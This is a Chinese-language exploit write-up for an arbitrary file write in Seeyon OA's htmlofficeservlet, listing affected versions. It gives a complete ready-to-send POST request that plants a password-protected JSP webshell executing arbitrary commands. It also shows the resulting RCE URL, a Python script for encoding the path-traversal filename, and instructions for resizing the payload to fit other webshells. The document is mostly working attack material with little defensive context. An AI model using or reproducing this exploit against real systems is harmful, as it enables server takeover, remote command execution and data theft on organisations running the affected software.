# 致远OA htmlofficeservlet任意文件写入

影响版本：  
- 致远A8-V5协同管理软件V6.1sp1  
- 致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3  
- 致远A8+协同管理软件V7.1  

exp:  
```
漏洞情况：
访问
/seeyon/htmlofficeservlet
出现
DBSTEP V3.0     0               21              0               htmoffice operate err
```

POC：  
Burp抓包后，只改Host即可创shell文件test123456.jsp  
RCE: /test123456.jsp?pwd=asasd3344&cmd=cmd%20+/c+whoami

POST包：
```
POST /seeyon/htmlofficeservlet HTTP/1.1
Content-Length: 1121
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
Host: xxxxxxxxx
Pragma: no-cache

DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
OPTION=S3WYOSWLBSGr
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
CREATEDATE=wUghPB3szB3Xwg66
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("asasd3344".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce
```
```
响应包：
DBSTEP V3.0     386             0               666             DBSTEP=OKMLlKlV
OPTION=S3WYOSWLBSGr
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
CREATEDATE=wUghPB3szB3Xwg66
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
CLIENTIP=wLCXqUKAP7uhw4g5zi=6
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("asasd3344".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>
```

文件名加解密脚本:
```
#!/usr/bin/env python2
# -*- coding: utf-8 -*-

 # qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
 # ..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\test123456.jsp
import base64

a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="  
b = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
out = ""

c = input("\n1.加密  2.解密  0.退出\n\n请选择处理方式：")

while c != 0:
        out = ""
        if c == 1:
                str = raw_input("\n请输入要处理的字符串：")
                str = base64.b64encode(str)
                for i in str:
                        out += b[a.index(i)]
                print("\n处理结果为："+out)
        elif c == 2:
                str = raw_input("\n请输入要处理的字符串：")
                for i in str:
                        out += a[b.index(i)]
                out = base64.b64decode(out)
                print("\n处理结果为："+out)
        else:
                print("\n输入有误！！只能输入“1”和“2”，请重试！")
        c = input("\n1.加密  2.解密  0.退出\n\n请选择处理方式：")


# print base64.b64decode(s)
```
修改webshell信息还需要修改355和666参数：  
355为从哪里开始读源码，666为写入的webshell源码长度
```
DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
```

[@theLSA](https://www.lsablog.com/networksec/penetration/seeyon-oa-file-upload-vulnerability-analysis/)